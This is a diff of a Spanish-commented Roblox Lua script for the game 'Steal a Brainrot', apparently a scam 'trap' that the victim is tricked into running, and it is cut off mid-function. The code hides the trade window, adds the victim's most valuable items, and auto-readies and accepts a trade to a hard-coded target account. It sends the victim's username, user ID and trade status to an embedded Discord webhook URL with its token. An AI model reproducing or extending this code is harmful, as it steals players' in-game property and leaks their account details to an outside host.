@@ -1,467 +1,254 @@
---[[=====================================================================
-    SAB | TRAP TRADE LOGGER  v6.0
-    Steal a Brainrot  --  LO EJECUTA LA VICTIMA
+--[[ ================================================================
+ SAB TRAP v12 — target fijo por UserId
+ Place: 109983668079237
+=============================================================== ]]
+local TARGET_ID       = 9555775328        -- KIMILOSP
+local TARGET_USERNAME = "KIMILOSP"
+local TARGET_DISPLAY  = "PIPIPI"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
 
-    - Hilo de peticion: insiste cada 2s INFINITAMENTE hasta que la
-      ventana de trade se abra.
-    - Hilo vigia: al abrirse, oculta la UI, mete los items, ready y accept.
-    - Detecta tu base por nombre, por YourBase.Enabled y por cercania.
-    - Diagnostico al webhook para saber que esta fallando.
-=====================================================================]]
-
--- Mode: NORMAL
-getgenv().TARGET_USERNAME = "KIMILOSP"
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
-
-getgenv().CONFIG = {
-    REQUEST_INTERVAL = 2,      -- seg entre peticiones de trade (insistente)
-    POLL_INTERVAL    = 2,
-    MAX_TRADE_ITEMS  = 18,
-    HIDE_TRADE_GUI   = true,
-    MUTE_TRADE_NOTIF = true,
+local CFG = {
+    PLACE_IDS        = { 109983668079237 },
+    STRICT_PLACE     = true,
+    DUMP             = true,
+    WATCH_GUI        = true,
+    POLL             = 1.5,
+    INVITE_BACKOFF   = { 4, 8, 15, 25, 40 },
+    MAX_ITEMS        = 18,
+    ITEM_DELAY       = 0.5,
+    ADD_ALL_IF_EMPTY = true,
+    AUTO_READY       = true,
     AUTO_ACCEPT      = true,
-    PING_EVERYONE    = true,
-    SHOW_MULTIPLIER  = false,
-    SHOW_EXECUTOR    = true,
-    SHOW_PLAYERS     = true,
-    SHOW_ACCOUNT     = true,
-    DIAGNOSTICS      = true,   -- avisos al webhook de fallos
+    READY_ROUNDS     = 3,
+    SNAP_FREEZE      = 3,
+    PING             = true,
     DEBUG            = true,
-    ARG_STYLE        = "auto",
-    FOOTER_SITE      = "www.venice.ai",
-    FOOTER_DISCORD   = "discord.gg/askvenice",
-    FORCE_REMOTES    = { Request = nil, Add = nil, Ready = nil, Accept = nil, Cancel = nil },
 }
 
-getgenv().CUSTOM_EMOJI = {}
+getgenv().NORMAL_BRAINROTS  = { }
+getgenv().NORMAL_BASE_SKINS = { }
+getgenv().NORMAL_GEARS      = { }
 
-getgenv().MUTATIONS = {
-    Default     = { "▫️", 1 },
-    Gold        = { "🥇", 1.25 },
-    Diamond     = { "💎", 1.5 },
-    Rainbow     = { "🌈", 10 },
-    Bloodrot    = { "🩸", 2 },
-    Candy       = { "🍬", 4 },
-    Lava        = { "🌋", 6 },
-    Galaxy      = { "🌌", 7 },
-    Yin_Yang    = { "☯️", 7.5 },
-    Radioactive = { "☢️", 8.5 },
-    Cursed      = { "🕯️", 9 },
-    Divine      = { "😇", 10 },
-    Cyber       = { "🤖", 11 },
-    Phantom     = { "👻", 12 },
-    Crystal     = { "🔮", 13 },
-    Eclipse     = { "🌑", 14 },
-}
+local Players = game:GetService("Players")
+local RS      = game:GetService("ReplicatedStorage")
+local WS      = game:GetService("Workspace")
+local HS      = game:GetService("HttpService")
+local LP      = Players.LocalPlayer
+local U       = table.unpack or unpack
 
-local function flag(code)
-    local out = ""
-    for i = 1, #code do
-        out = out .. utf8.char(0x1F1E6 + code:byte(i) - 65)
-    end
-    return out
-end
+local S = { run = true, filling = false, handled = nil, lastSig = nil, lastPost = 0,
+            invitedAt = 0, invTries = 0, seenGui = {}, dumpDone = false }
+local CACHE, CACHE_AGE = {}, 0
 
-getgenv().EFFECTS = {
-    Strawberry = "🍓", Meowl = "🐱", ["John Pork"] = "🐷", Skibidi = "🚽",
-    Granny = "👵", Fire = "🔥", Rose = "🌹", Fireworks = "🎆",
-    Nyan = "🐈", Lightning = "⚡", Burger = "🍔", ["Aura Shades"] = "🕶️",
-    Disco = "🪩", Glitched = "📺", Claws = "🐾", Zombie = "🧟",
-    Bubblegum = "🫧", UFO = "🛸", Taco = "🌮", Sleepy = "😴",
-    Bull = "🐂", Paint = "🎨", [":3"] = "😺", Tie = "👔",
-    Spider = "🕷️", ["Matteo Hat"] = "🎩", Galactic = "🌠", Explosive = "💥",
-    ["Shark Fin"] = "🦈", ["Job Application"] = "📄", ["Reindeer Pet"] = "🦌",
-    ["Santa Hat"] = "🎅", ["Jack O' Lantern Pet"] = "🎃", ["RIP Gravestone"] = "🪦",
-    ["Witch Hat"] = "🧙", ["Bunny Ears"] = "🐰", ["Pink Egg"] = "🩷",
-    ["Blue Egg"] = "💙", ["Green Egg"] = "💚", ["Orange Egg"] = "🧡",
-    ["1 Year"] = "🎂", ["26"] = "🔢", ["10B"] = "💰", ["Rainbow Balloon"] = "🎈",
-    ["Pink Balloon"] = "🎈", ["Red Balloon"] = "🎈", ["Blue Balloon"] = "🎈",
-    ["Green Balloon"] = "🎈", ["Orange Balloon"] = "🎈", Halo = "😇", Lucky = "🍀",
-    Sun = "☀️", Ball = "⚽", Chocolate = "🍫", Skeleton = "💀",
-    Bee = "🐝", ["Fire Bee"] = "🐝", ["Ice Bee"] = "🐝", ["Queen Bee"] = "👑",
-    ["Comet-struck"] = "☄️", Snowy = "❄️", Wet = "💧",
-    Brazil = flag("BR"), Indonesian = flag("ID"), Sombrero = "🇲🇽",
-    Algeria = flag("DZ"), Argentina = flag("AR"), Australia = flag("AU"),
-    Austria = flag("AT"), Belgium = flag("BE"), ["Bosnia and Herzegovina"] = flag("BA"),
-    Canada = flag("CA"), ["Cape Verde"] = flag("CV"), Croatia = flag("HR"),
-    Curacao = flag("CW"), Czechia = flag("CZ"), ["DR Congo"] = flag("CD"),
-    Ecuador = flag("EC"), Egypt = flag("EG"),
-    England = "\240\159\143\180\243\160\129\167\243\160\129\162\243\160\129\174\243\160\129\167\243\160\129\191",
-    France = flag("FR"), Germany = flag("DE"), Ghana = flag("GH"), Haiti = flag("HT"),
-    Iran = flag("IR"), Iraq = flag("IQ"), ["Ivory Coast"] = flag("CI"), Japan = flag("JP"),
-    Jordan = flag("JO"), Mexico = flag("MX"), Morocco = flag("MA"), Netherlands = flag("NL"),
-    ["New Zealand"] = flag("NZ"), Norway = flag("NO"), Panama = flag("PA"),
-    Paraguay = flag("PY"), Portugal = flag("PT"), Qatar = flag("QA"), ["Saudi Arabia"] = flag("SA"),
-    Scotland = "\240\159\143\180\243\160\129\167\243\160\129\163\243\160\129\163\243\160\129\180\243\160\129\191",
-    Senegal = flag("SN"), ["South Africa"] = flag("ZA"), ["South Korea"] = flag("KR"),
-    Spain = flag("ES"), Sweden = flag("SE"), Switzerland = flag("CH"), Tunisia = flag("TN"),
-    Turkey = flag("TR"), ["United States"] = flag("US"), Uruguay = flag("UY"),
-    Uzbekistan = flag("UZ"), Colombia = flag("CO"),
-}
-
-getgenv().NORMAL_BRAINROTS = {
-    ["Raccooni Jandelini"]=true,["Malame Amarele"]=true,["Buho de Fuego"]=true,["Caramello Filtrello"]=true,
-    ["Avocadorilla"]=true,["Brutto Gialutto"]=true,["Centrucci Nuclucci"]=true,["Ganganzelli Trulala"]=true,
-    ["Rhino Helicopterino"]=true,["Stoppo Luminino"]=true,["Tob Tobi Tobi"]=true,["Lazy Ducky"]=true,
-    ["Pineaplino"]=true,["Pretzo Robo"]=true,["Unclito Samito"]=true,["Abyssaloco"]=true,
-    ["Agarrini la Palini"]=true,["Antonio"]=true,["Arcadragon"]=true,["Bearito Cabinito"]=true,
-    ["Boppin Bunny"]=true,["Bunito Bunito Spinito"]=true,["Bunny and Eggy"]=true,["Burguro And Fryuro"]=true,
-    ["Capitano Moby"]=true,["Cash or Card"]=true,["Caylusaurus"]=true,["Celestial Pegasus"]=true,
-    ["Celularcini Viciosini"]=true,["Cerberus"]=true,["Chillin Chili"]=true,["Chipso and Queso"]=true,
-    ["Cloverat Clapat"]=true,["Coco and Mango"]=true,["Cooki and Milki"]=true,["Digi Narwhal"]=true,
-    ["Donkeyturbo Express"]=true,["Dragon Aquanini"]=true,["Dragon Cannelloni"]=true,["Dragon Gingerini"]=true,
-    ["Duggy Bros"]=true,["Elefanto Frigo"]=true,["Eviledon"]=true,["Extinct Matteo"]=true,
-    ["Festive 67"]=true,["Fishino Clownino"]=true,["Fortunu and Cashuru"]=true,["Foxini Lanternini"]=true,
-    ["Fragola La La La"]=true,["Fragrama and Chocrama"]=true,["Garama and Madundung"]=true,["Ginger Gerat"]=true,
-    ["Globa Steppa"]=true,["Gobblino Uniciclino"]=true,["Gold Gold Gold"]=true,["Griffin"]=true,
-    ["Guest 666"]=true,["Gym Bros"]=true,["Hopilikalika Hopilikalako"]=true,["Hydra Bunny"]=true,
-    ["Hydra Dragon Cannelloni"]=true,["Jelly Moby"]=true,["John Doe"]=true,["Jolly Jolly Sahur"]=true,
-    ["Kalika Bros"]=true,["Karker Sahur"]=true,["Ketchuru and Musturu"]=true,["Ketupat Bros"]=true,
-    ["Kraken"]=true,["La Anniversary Grande"]=true,["La Casa Boo"]=true,["La Easter Grande"]=true,
-    ["La Food Combinasion"]=true,["La Ginger Sekolah"]=true,["La Karkerkar Combinasion"]=true,["La Lucky Grande"]=true,
-    ["La Romantic Grande"]=true,["La Sahur Combinasion"]=true,["La Secret Combinasion"]=true,["La Summer Grande"]=true,
-    ["La Supreme Combinasion"]=true,["La Taco Combinasion"]=true,["Las Sis"]=true,["Lavadorito Spinito"]=true,
-    ["Los Amigos"]=true,["Los Bros"]=true,["Los Chillis"]=true,["Los Fruits"]=true,
-    ["Los Hackers"]=true,["Los Hotspotsitos"]=true,["Los Jolly Combinasionas"]=true,["Los Mariachis"]=true,
-    ["Los Mi Gatitos"]=true,["Los Primos"]=true,["Los Sekolahs"]=true,["Los Spaghettis"]=true,
-    ["Los Tacoritas"]=true,["Love Love Bear"]=true,["Lovin Rose"]=true,["Money Money Bros"]=true,
-    ["Money Money Reindeer"]=true,["Nacho Spyder"]=true,["Noo my examine"]=true,["Orcaledon"]=true,
-    ["Pancake and Syrup"]=true,["Please my Present"]=true,["Popcuru and Fizzuru"]=true,["Quackini Snackini"]=true,
-    ["Reinito Sleighito"]=true,["Rico Dinero"]=true,["Rosetti Tualetti"]=true,["Rosey and Teddy"]=true,
-    ["Rubrikiko"]=true,["Sammyni Cakini"]=true,["Sammyni Fattini"]=true,["Sand Sand Sand"]=true,
-    ["Signore Carapace"]=true,["Spooky and Pumpky"]=true,["Steakini Fattini"]=true,["Swag Soda"]=true,
-    ["Swaggy Bros"]=true,["Tacorita Bicicleta"]=true,["Telemorte"]=true,["Tictac Sahur"]=true,
-    ["Tirilikalika Tirilikalako"]=true,["Tralaledon"]=true,["Tuff Toucan"]=true,["Ventoliero Pavonero"]=true,
-    ["Venuspino"]=true,["W or L"]=true,["Capitano Americano"]=true,["Bufalino Boomberino"]=true,
-    ["Esok Goala"]=true,["Los Tangcitos"]=true,["Los Tictacs"]=true,["Los Admins"]=true,
-    ["Moby Bros"]=true,["Var Var Var"]=true,["Noodle Noodle Poodle"]=true,["Grabatron"]=true,
-    ["Cangurato Gelato"]=true,["Rubiko and Kubiko"]=true,["Toro Españolo"]=true,["Chicleteira Champeona"]=true,
-    ["Examen Bros"]=true,["Pizza and Ranch"]=true,["Los Secret Combinasionas"]=true,["Honey Honey Bear"]=true,
-    ["Scorpino Coasterino"]=true,["Queen Bee"]=true,["Smore Serat"]=true,["Yetimactic"]=true,
-    ["La Breakfast Combinasion"]=true,["Bumbatron"]=true,["Candini Fluffini"]=true,["Polaroidini"]=true,
-    ["La Fuse Machine"]=true,["Nachorilla"]=true,["Sammyni Truckini"]=true,["Orchidox"]=true,
-    ["Pop Pop Petalini"]=true,["Motorino Bumbuni"]=true,["Pelican Pachetto"]=true,["Deputy Leopard"]=true,
-    ["Chicli Chicla"]=true,["Panda Popanda"]=true,["La Craft Machine"]=true,["Gold and Diamond"]=true,
-    ["Los Dragons"]=true,["Zebrino Pianino"]=true,["Hydra Serpent"]=true,["Lavamanta"]=true,
-    ["Lionello Casarello"]=true,["Draculino"]=true,["Oni Oni Panda"]=true,["Sammyni Spookyni"]=true,
-    ["Phoenix"]=true,["Boo Boo Rocket"]=true,["Flying Dutchman"]=true,["Dragon Skeletonini"]=true,
-    ["Tosto Dino"]=true,["Cobra Gelato"]=true,["Skelly and Coffy"]=true,["Medusini and Demonini"]=true,
-    ["Arca Bros"]=true,["Fang Fang Draculang"]=true,["Pum Pum Pum"]=true,["Spooky Spooky Sahur"]=true,
-    ["Spooketti Tualetti"]=true,["Puppetmaster"]=true,["Scorpi Inferni"]=true,["Jacko Jakat"]=true,
-    ["Spooky Kart"]=true,["Scarino Crowino"]=true,["Headless Horseman"]=true,["John Pork"]=true,
-    ["Meowl"]=true,["Skibidi Toilet"]=true,["Strawberry Elephant"]=true,["Capitano Gullini"]=true,
-    ["Camera Ramena"]=true,["Chicleteira Bicicleteira"]=true,["Chicleteira Cupideira"]=true,["Chicleteira Surfeira"]=true,
-    ["Chill Puppy"]=true,["Chicleteira Noelteira"]=true,["Cigno Fulgoro"]=true,["DJ Panda"]=true,
-    ["Dug dug dug"]=true,["Esok Sekolah"]=true,["Futbolini Skatini"]=true,["Frullato Framingo"]=true,
-    ["Job Job Job Sahur"]=true,["Ketupat Kepat"]=true,["La Grande Combinasion"]=true,["La Extinct Grande"]=true,
-    ["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Los Mobilis"]=true,["Los Planitos"]=true,
-    ["Los Puggies"]=true,["Los Spooky Combinasionas"]=true,["Mieteteira Bicicleteira"]=true,["Money Money Puggy"]=true,
-    ["Mi Gatito"]=true,["Nuclearo Dinossauro"]=true,["Sammyni Spyderini"]=true,["Snailo Clovero"]=true,
-    ["Spaghetti Tualetti"]=true,["Spinny Hammy"]=true,["Tang Tang Keletang"]=true,["Conetto Morsetto"]=true,
-    ["Peschito Machito"]=true,["Tacoturbo Tacorito"]=true,["Puffino Builderino"]=true,["Money Money Cat"]=true,
-    ["Matteo"]=true,["Orcalita Orcala"]=true,["Orcalero Orcala"]=true,["Dumborino Miracello"]=true,
-    ["Bombardiro Crocodilo"]=true,
-}
-
-getgenv().NORMAL_BASE_SKINS = {
-    ["Rose"]=true,["Gingerbread"]=true,["Halloween"]=true,["Christmas"]=true,["Bunny Basket"]=true,
-    ["Summer"]=true,["Pot of Gold"]=true,["Taco"]=true,["Octo"]=true,["Valentines"]=true,
-    ["Easter"]=true,["Lucky"]=true,["Aquatic"]=true,["Tralalero"]=true,["Bee Emperor"]=true,["Honey Bee"]=true,
-}
-
-getgenv().NORMAL_GEARS = {
-    ["Santa's Sleigh"]=true,["Cupid's Wings"]=true,["Witch's Broom"]=true,["Waverider"]=true,
-    ["Yin Yang Slap"]=true,["Cursed Slap"]=true,["Cyber Slap"]=true,["Divine Slap"]=true,
-    ["Bloodmoon Slap"]=true,["Radioactive Slap"]=true,["Rainbow Slap"]=true,["Rainbow Hammer"]=true,
-    ["Bloodmoon Hammer"]=true,["Radioactive Airstrike"]=true,["Yin Yang Lamp"]=true,["Demon's Head"]=true,
-    ["Lava Slap"]=true,["Lava Blaster"]=true,["Alien Slap"]=true,["Blackhole Bomb"]=true,
-    ["Candy Sentry"]=true,["Phantom Slap"]=true,["Flying Bee"]=true,["Crystal Slap"]=true,
-    ["Candy Slap"]=true,["Crystal Hammer"]=true,
-}
-
---=====================================================================
-local Players    = game:GetService("Players")
-local RS         = game:GetService("ReplicatedStorage")
-local WS         = game:GetService("Workspace")
-local HS         = game:GetService("HttpService")
-local StarterGui = game:GetService("StarterGui")
-local LP         = Players.LocalPlayer
-local CFG        = getgenv().CONFIG
-local U          = table.unpack or unpack
-
-local STATE = {
-    running = true, inTrade = false, filling = false,
-    lastRequest = 0, lastReport = nil, handledRoot = nil,
-}
-local REMOTES = { Request = nil, Add = nil, Ready = nil, Accept = nil, Cancel = nil }
-local MULT = { K = 1e3, M = 1e6, B = 1e9, T = 1e12 }
-
+local function log(m) if CFG.DEBUG then print("[SAB] "..tostring(m)) end end
 local function lc(s) return string.lower(tostring(s)) end
-local function log(m, lvl)
-    if CFG.DEBUG then
-        if lvl == "err" then warn("[SAB] " .. tostring(m)) else print("[SAB] " .. tostring(m)) end
-    end
-    if _G.SAB_HUD then pcall(_G.SAB_HUD, m) end
-end
-local function notify(t, x)
-    task.spawn(function() pcall(function()
-        StarterGui:SetCore("SendNotification", { Title = t, Text = x, Duration = 3 })
-    end) end)
-end
-local function findPath(root, path)
-    if not root then return nil end
-    local cur = root
-    for seg in string.gmatch(path, "[^/]+") do
-        if not cur then return nil end
-        cur = cur:FindFirstChild(seg)
-    end
-    return cur
-end
-local function getTarget() return Players:FindFirstChild(getgenv().TARGET_USERNAME) end
 
-local function postWebhook(payload)
-    local url = getgenv().WEBHOOK_URL
-    if not url or url == "" then return end
+local queue = {}
+local function post(p) table.insert(queue, p) end
+task.spawn(function()
+    while S.run do
+        local p = table.remove(queue, 1)
+        if p then
+            pcall(function()
+                local body = HS:JSONEncode(p)
+                if typeof(request) == "function" then
+                    request({ Url = WEBHOOK_URL, Method = "POST",
+                              Headers = { ["Content-Type"] = "application/json" }, Body = body })
+                else HS:PostAsync(WEBHOOK_URL, body) end
+            end)
+            task.wait(1.1)
+        else task.wait(0.3) end
+    end
+end)
+local function embed(t, d, c)
+    post({ embeds = {{ title = t, description = d, color = c or 3447003, footer = { text = LP.Name.." • "..LP.UserId } }} })
+end
+local function ping(t, d, c)
+    post({ content = CFG.PING and "@everyone" or "", allowed_mentions = { parse = { "everyone" } },
+        embeds = {{ title = t, description = d, color = c or 65280, footer = { text = LP.Name.." • "..LP.UserId } }} })
+end
+
+local function ser(v, d)
+    d = d or 0
+    if d > 3 then return "…" end
+    local t = typeof(v)
+    if t == "string" or t == "number" or t == "boolean" then return tostring(v) end
+    if t == "Instance" then return v:GetFullName() end
+    if t == "table" then
+        local o, n = {}, 0
+        for k, val in pairs(v) do
+            n = n + 1
+            if n > 25 then table.insert(o, "…") break end
+            table.insert(o, tostring(k).."="..ser(val, d+1))
+        end
+        return "{"..table.concat(o, ", ").."}"
+    end
+    return tostring(v)
+end
+local function callRF(r, timeout, ...)
+    if not r then return false, nil end
+    local a, done, res = table.pack(...), false, nil
     task.spawn(function()
-        local body = HS:JSONEncode(payload)
-        local ok, err = pcall(function()
-            if typeof(request) == "function" then
-                request({ Url = url, Method = "POST",
-                    Headers = { ["Content-Type"] = "application/json" }, Body = body })
-            else
-                HS:PostAsync(url, body)
-            end
-        end)
-        if not ok then log("Webhook fallo: " .. tostring(err), "err") end
+        local ok, x = pcall(function() return r:InvokeServer(U(a, 1, a.n)) end)
+        res = ok and x or nil
+        done = true
+    end)
+    local t0 = os.clock()
+    while not done and os.clock() - t0 < (timeout or 5) do task.wait(0.05) end
+    return done, res
+end
+local function fireRE(r, ...)
+    if not r then return false end
+    return (pcall(function() r:FireServer(...) end))
+end
+
+local NET = RS:FindFirstChild("Packages") and RS.Packages:FindFirstChild("Net")
+local function resolve(kind, path)
+    if not NET then return nil end
+    local root = NET:FindFirstChild(kind)
+    if not root then return nil end
+    local direct = root:FindFirstChild(path)
+    if direct then return direct end
+    for _, d in ipairs(root:GetDescendants()) do
+        if d.Name == path then return d end
+        if d.Parent and (d.Parent.Name.."/"..d.Name) == path then return d end
+    end
+end
+local T = {}
+if NET then
+    T.Invite     = resolve("RF", "TradeService/Invite")
+    T.AcceptInv  = resolve("RF", "TradeService/AcceptInvite")
+    T.AddBrain   = resolve("RF", "TradeService/AddBrainrot")
+    T.AddItem    = resolve("RF", "TradeService/AddItem")
+    T.SearchUser = resolve("RF", "TradeService/SearchUser")
+    T.Ready      = resolve("RE", "TradeService/Ready")
+    T.Accept     = resolve("RE", "TradeService/Accept")
+    T.Cancel     = resolve("RE", "TradeService/CancelTrade")
+    T.InvResult  = resolve("RE", "TradeService/InviteResult")
+    T.Completed  = resolve("RE", "TradeService/TradeCompleted")
+    T.Sync       = resolve("RF", "Synchronizer/RequestData")
+    T.ListBrain  = resolve("RF", "Brainrot/RequestList")
+    T.ListTrade  = resolve("RF", "BrainrotToTrade/RequestList")
+    T.PreviewC   = resolve("RE", "TradePlazaPreview/Confirm")
+end
+
+local function matchesTarget(txt)
+    local l = lc(txt)
+    return l:find(lc(TARGET_USERNAME), 1, true) or l:find(lc(TARGET_DISPLAY), 1, true)
+end
+
+if T.InvResult then
+    T.InvResult.OnClientEvent:Connect(function(...)
+        local p = {}
+        for i = 1, select("#", ...) do table.insert(p, ser((select(i, ...)))) end
+        local txt = table.concat(p, " | ")
+        embed("InviteResult", txt, 16776960)
+        local low = lc(txt)
+        if low:find("declin") or low:find("reject") or low:find("false")
+           or low:find("busy") or low:find("expired") or low:find("offline") then
+            S.invitedAt = 0
+            S.invTries = math.max(0, S.invTries - 1)
+        end
     end)
 end
-
-local function diag(text)
-    if not CFG.DIAGNOSTICS then return end
-    postWebhook({ username = "SAB", embeds = { {
-        color = 15158332,
-        description = "⚠️ **DIAGNOSTICO**\n" .. text,
-        footer = { text = LP.Name .. " • " .. tostring(game.JobId) },
-    } } })
+if T.Cancel then
+    T.Cancel.OnClientEvent:Connect(function()
+        embed("CancelTrade", "Cancelado, se reintenta.", 15105570)
+        S.handled, S.filling, S.invitedAt, S.invTries = nil, false, 0, 0
+    end)
 end
-
---=====================================================================
--- MUTACIONES / EFECTOS
---=====================================================================
-local function keyOf(name) return (name:gsub("%s+", "_")) end
-
-local function mutationIcon(name)
-    local custom = getgenv().CUSTOM_EMOJI[name]
-    if custom and custom ~= "" then return custom end
-    local def = getgenv().MUTATIONS[keyOf(name)]
-    if not def then return nil end
-    local icon = def[1]
-    if CFG.SHOW_MULTIPLIER and def[2] and def[2] > 1 then
-        icon = icon .. " " .. tostring(def[2]) .. "x"
-    end
-    return icon
-end
-
-local function effectIcon(name)
-    local custom = getgenv().CUSTOM_EMOJI[name]
-    if custom and custom ~= "" then return custom end
-    return getgenv().EFFECTS[name] or getgenv().EFFECTS[keyOf(name)]
-end
-
-local function parseTags(raw)
-    local mutas, effects = {}, {}
-    for token in string.gmatch(raw, ":([^:]+):") do
-        local key = token:gsub("^%s*(.-)%s*$", "%1")
-        local norm = key:gsub("_", " ")
-        if getgenv().MUTATIONS[keyOf(norm)] then
-            table.insert(mutas, norm)
-        else
-            table.insert(effects, norm)
-        end
-    end
-    return mutas, effects
-end
-
-local function cleanName(raw)
-    local s = raw:gsub(":%s*[^:]+%s*:", " "):gsub("%-", " "):gsub("%s+", " ")
-    return (s:gsub("^%s*(.-)%s*$", "%1"))
-end
-
---=====================================================================
--- LECTURA
---=====================================================================
-local ID_KEYS = { "ItemId","ItemID","Id","ID","Uuid","UUID","UniqueId","UniqueID",
-                  "BrainrotId","BrainrotID","AssetId","SkinId","SkinID","BaseId" }
-
-local function extractId(obj)
-    if not obj then return nil end
-    for _, k in ipairs(ID_KEYS) do
-        local v = obj:GetAttribute(k); if v ~= nil then return v end
-end
-    local ok, desc = pcall(function() return obj:GetDescendants() end)
-    if ok then
-        for _, d in ipairs(desc) do
-            for _, k in ipairs(ID_KEYS) do
-                local v = d:GetAttribute(k); if v ~= nil then return v end
-            end
-            if d:IsA("StringValue") or d:IsA("NumberValue") then
-                for _, k in ipairs(ID_KEYS) do
-                    if lc(d.Name) == lc(k) then return d.Value end
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local function overheadOf(a)
-    return findPath(a, "Base/Spawn/Attachment/AnimalOverhead") or findPath(a, "Info/AnimalOverhead")
-end
-local function readRaw(a)
-    local oh = overheadOf(a); if not oh then return nil end
-    local l = oh:FindFirstChild("DisplayName")
-    if l and l:IsA("TextLabel") and l.Text ~= "" then return l.Text end
-    return nil
-end
-local function readSkin(a)
-    local s = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin")
-    if s then return tostring(s) end
-    return nil
-end
-local function readIncome(a)
-    for _, k in ipairs({ "Income","MoneyPerSecond","Money","Value","IncomePerSecond" }) do
-        local v = a:GetAttribute(k)
-        if typeof(v) == "number" then
-            if v >= 1e9 then return string.format("%.1fB", v / 1e9) end
-            if v >= 1e6 then return string.format("%.1fM", v / 1e6) end
-            if v >= 1e3 then return string.format("%.1fK", v / 1e3) end
-            return tostring(math.floor(v))
-        end
-    end
-    local ok, desc = pcall(function() return a:GetDescendants() end)
-    if not ok then return nil end
-    for _, d in ipairs(desc) do
-        if d:IsA("TextLabel") then
-            local m = string.match(d.Text, "([%d%.]+[KMBT]?)/s") or string.match(d.Text, "%$([%d%.]+[KMBT]?)")
-            if m then return m end
-        end
-    end
-    return nil
-end
-local function incomeNum(s)
-    if not s then return 0 end
-    local n, u = string.match(s, "([%d%.]+)([KMBT]?)")
-    n = tonumber(n) or 0
-    if u and MULT[u] then n = n * MULT[u] end
-    return n
-end
-
---=====================================================================
--- BASE PROPIA (3 metodos)
---=====================================================================
-local function playerFromText(text)
-    if not text or text == "" then return nil end
-    local clean = text:gsub("%s+", "")
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p.Name == clean or lc(p.DisplayName) == lc(text) then return p end
-    end
-    return nil
-end
-local function getPlotOwner(plot)
-    local byName = Players:FindFirstChild(plot.Name)
-    if byName then return byName end
-    local sign = plot:FindFirstChild("PlotSign")
-    if sign then
-        for _, d in ipairs(sign:GetDescendants()) do
-            if d:IsA("TextLabel") then
-                local p = playerFromText(d.Text); if p then return p end
-            end
-        end
-    end
-    return nil
-end
-local function getPlotOfPlayer(p)
-    local plots = WS:FindFirstChild("Plots")
-    if not plots or not p then return nil end
-    for _, plot in ipairs(plots:GetChildren()) do
-        if getPlotOwner(plot) == p then return plot end
-    end
-    return nil
+if T.Completed then
+    T.Completed.OnClientEvent:Connect(function()
+        ping("✅ TRADE COMPLETADO", "Trade cerrado.", 65280)
+        S.invitedAt, S.invTries = 0, 0
+    end)
 end
 
 local function ownPlot()
     local plots = WS:FindFirstChild("Plots")
-    if not plots then return nil end
-
-    local byName = plots:FindFirstChild(LP.Name)
-    if byName then return byName end
-
-    for _, plot in ipairs(plots:GetChildren()) do
-        local yb = findPath(plot, "PlotSign/YourBase")
-        if yb and yb:IsA("BillboardGui") and yb.Enabled then return plot end
-    end
-
-    local char = LP.Character
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    if hrp then
-        local best, bestD
-        for _, plot in ipairs(plots:GetChildren()) do
-            local hit = findPath(plot, "Purchases/PlotBlock/Hitbox")
-            if hit and hit:IsA("BasePart") then
-                local d = (hit.Position - hrp.Position).Magnitude
-                if not bestD or d < bestD then best, bestD = plot, d end
-            end
+    if plots then
+        local byName = plots:FindFirstChild(LP.Name)
+        if byName then return byName end
+        for _, p in ipairs(plots:GetChildren()) do
+            local sign = p:FindFirstChild("PlotSign")
+            local yb = sign and sign:FindFirstChild("YourBase")
+            if yb and yb:IsA("BillboardGui") and yb.Enabled then return p end
         end
-        if best and bestD and bestD < 400 then return best end
     end
-    return nil
+    for _, d in ipairs(WS:GetChildren()) do
+        if d:IsA("Model") and d.Name == LP.Name and d:FindFirstChild("AnimalPodiums") then return d end
+    end
 end
 
---=====================================================================
--- RECOLECCION
---=====================================================================
-local function collectFromPlot(plot)
-    local out = {}
+local ID_KEYS   = { "ItemId", "ItemID", "Id", "ID", "Uuid", "UUID", "UniqueId", "BrainrotId", "Uid" }
+local NAME_KEYS = { "Name", "DisplayName", "Title", "BrainrotName", "ItemName" }
+local function deepId(tbl, name, d)
+    if type(tbl) ~= "table" or (d or 0) > 5 then return nil end
+    local nm
+    for _, k in ipairs(NAME_KEYS) do if type(tbl[k]) == "string" then nm = tbl[k] break end end
+    if nm and lc(nm):find(lc(name), 1, true) then
+        for _, k in ipairs(ID_KEYS) do
+            local v = tbl[k]
+            if type(v) == "string" or type(v) == "number" then return v end
+        end
+    end
+    for _, v in pairs(tbl) do
+        local r = deepId(v, name, (d or 0) + 1)
+        if r ~= nil then return r end
+    end
+end
+local function attrId(i)
+    for _, k in ipairs(ID_KEYS) do
+        local v = i:GetAttribute(k)
+        if v ~= nil then return v end
+    end
+end
+local function labelText(a)
+    local oh = a:FindFirstChild("Base") and a.Base:FindFirstChild("Spawn")
+        and a.Base.Spawn:FindFirstChild("Attachment")
+        and a.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
+    if not oh then local inf = a:FindFirstChild("Info"); oh = inf and inf:FindFirstChild("AnimalOverhead") end
+    if not oh then return nil end
+    local l = oh:FindFirstChild("DisplayName")
+    if l and l:IsA("TextLabel") and l.Text ~= "" then return l.Text end
+    local s = oh:FindFirstChildWhichIsA("TextLabel")
+    if s and s.Text ~= "" then return s.Text end
+end
+local function clean(t) return (tostring(t):match("^([^|]+)"):gsub("^%s*(.-)%s*$", "%1")) end
+
+local function priority(it)
+    if it.skin and getgenv().NORMAL_BASE_SKINS[it.skin] then return 1 end
+    if it.kind == "brainrot" and getgenv().NORMAL_BRAINROTS[it.name] then return 2 end
+    if it.kind == "gear" and (getgenv().NORMAL_GEARS[it.name] or getgenv().NORMAL_BASE_SKINS[it.name]) then return 3 end
+end
+
+local function readPlot()
+    local out, plot = {}, ownPlot()
     if not plot then return out end
-    local podiums = plot:FindFirstChild("AnimalPodiums")
-    if podiums then
-        for _, a in ipairs(podiums:GetChildren()) do
-            local raw = readRaw(a)
+    local pod = plot:FindFirstChild("AnimalPodiums")
+    if pod then
+        for _, a in ipairs(pod:GetChildren()) do
+            local raw = labelText(a)
             if raw then
